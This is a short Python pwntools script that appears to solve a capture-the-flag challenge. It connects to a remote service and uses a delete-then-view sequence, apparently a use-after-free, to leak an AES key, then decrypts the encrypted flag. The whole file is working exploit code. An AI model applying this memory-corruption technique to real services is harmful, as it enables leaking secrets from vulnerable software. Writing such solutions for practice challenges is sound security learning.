from pwn import *
from aes import AES # custom AES with fixed sbox

context.binary = elf = ELF("./vuln")
#conn = process()
conn = remote("34.34.58.135", 1337)
#context.log_level = 'debug'

conn.sendline(b"2") # delete cipher
conn.sendline(b"0") # aes

conn.sendline(b"3") # create secret
conn.sendline(b"0") # index 0
conn.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaaaaa") # set secret
conn.sendline(b"2") # use NOP

conn.sendline(b"4") # delete secret
conn.sendline(b"0") # index 0

conn.sendline(b"5") # view secret
conn.recvuntil(b"ciphertext to view (0-15): ")
conn.sendline(b"0") # index

key = bytes.fromhex(conn.recv(3*8).decode()) + b'\0'*8 # get key

conn.sendline(b"6") # encrypt flag
conn.sendline(b"1") # index

conn.sendline(b"5") # view secret
conn.recvuntil(b"ciphertext to view (0-15): ")
conn.sendline(b"1") # index

c = AES(key)
flag = bytes.fromhex(conn.recvline().decode()) # get key
print(c.decrypt_cbc(flag, b'\0'*16)[12:])

